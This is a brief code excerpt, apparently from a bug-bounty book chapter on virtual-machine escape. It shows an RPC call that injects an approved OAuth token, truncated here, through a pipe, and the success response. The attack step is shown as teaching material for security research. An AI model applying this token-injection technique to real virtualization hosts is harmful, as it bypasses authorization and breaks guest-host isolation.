// Extraído de: LibroBugBounty/cap-13-vm-escape-rpc.md
send_rpc(pipe, "addApprovedOauthToken",
    "\"token\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...\"");
// {"success":true}
